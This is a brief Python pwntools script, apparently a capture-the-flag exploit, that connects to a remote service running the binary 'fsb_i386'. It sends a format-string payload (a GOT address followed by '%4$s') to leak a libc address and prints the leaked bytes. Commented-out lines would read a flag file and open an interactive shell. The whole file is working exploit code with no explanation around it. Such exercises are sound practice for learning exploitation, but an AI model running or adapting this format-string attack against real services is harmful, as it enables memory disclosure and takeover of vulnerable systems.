from pwn import *

target = remote('10.214.160.13', 11006)
# target = process('./fsb_i386')

elf = ELF('./fsb_i386')
puts_got = elf.got['memset']

payload = p32(puts_got) + b'%4$s'
target.recv()
target.sendline(payload)
print(target.recvline()[4:8].hex())

# target.sendline(b'cat /data/flag')
# target.interactive()
